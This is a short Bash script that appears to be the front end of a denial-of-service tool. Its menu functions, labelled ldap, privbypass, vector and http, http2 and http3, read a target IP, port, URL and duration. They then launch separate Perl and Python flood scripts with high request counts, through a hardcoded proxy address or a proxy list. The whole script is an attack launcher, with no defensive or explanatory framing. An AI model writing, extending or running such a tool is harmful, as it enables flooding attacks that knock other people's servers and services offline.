ldap(){
echo -en "
╔═════════════════════╗
║ IP : "
read ip
echo -en "
║ PORT : "
read port
echo -en "
║ TIME : "
read time
python3 gott.3.py ${ip} ${port} ${time}
}


privbypass(){
echo -en "
╔═════════════════════╗
║ HOST : "
read ip
echo -en "
║ TIME : "
read time
perl gott.5.pl ${ip} ${time}
}

vector(){
echo -en "
╔═════════════════════╗
║ HOST : "
read ip
echo -en "
║ TIME : "
read time
perl gott.12.pl ${ip} ${time}
}


http(){
echo -en "
╔═════════════════════╗
║ URL : "
read url
perl gott.6.pl ${url} 1000 50 100
}

http2(){
echo -en "
╔═════════════════════╗
║ URL : "
read url
perl gott.13.pl ${url} 9999 1000 GET 82.137.20.145:8080
}

http3(){
echo -en "
╔═════════════════════╗
║ URL : "
read url
perl gott.13.pl ${url} 9999 1000 GET proxies.txt:8080
}

